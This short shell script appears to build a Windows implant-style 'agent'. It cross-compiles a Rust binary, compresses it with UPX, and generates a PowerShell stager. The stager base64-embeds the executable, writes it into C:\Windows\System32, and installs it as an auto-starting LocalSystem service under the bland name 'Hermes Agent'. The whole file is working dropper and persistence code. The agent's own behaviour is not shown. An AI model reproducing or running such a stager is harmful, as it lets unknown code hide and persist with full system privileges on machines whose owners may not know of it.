#/bin/sh
cargo +nightly b --release -p agent --target x86_64-pc-windows-gnu
upx --best --lzma target/x86_64-pc-windows-gnu/release/agent.exe
cat > generated_stager.ps1 << EOF
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "You do not have Administrator rights to run this script! Please re-run this script as Administrator!"
    Break
}

\$PSScriptRoot = "C:\Windows\System32"
\$base64Data = "$(base64 -i target/x86_64-pc-windows-gnu/release/agent.exe)"
\$byteArray = [Convert]::FromBase64String(\$base64Data)
\$filePath = Join-Path -Path \$PSScriptRoot -ChildPath "agent.exe"
[System.IO.File]::WriteAllBytes(\$filePath, \$byteArray)

\$serviceName = "Agent"
\$serviceDisplayName = "Hermes Agent"
\$serviceDescription = "This is the Hermes service agent."
\$binaryPath = (Get-Item -Path \$filePath).FullName
\$startupType = "Automatic"
\$serviceAccount = "LocalSystem"
New-Service -Name \$serviceName -DisplayName \$serviceDisplayName -BinaryPathName 'C:\WINDOWS\System32\agent.exe' -Description \$serviceDescription -StartupType \$startupType -ServiceAccount \$serviceAccount
Start-Service -Name \$serviceName
EOF
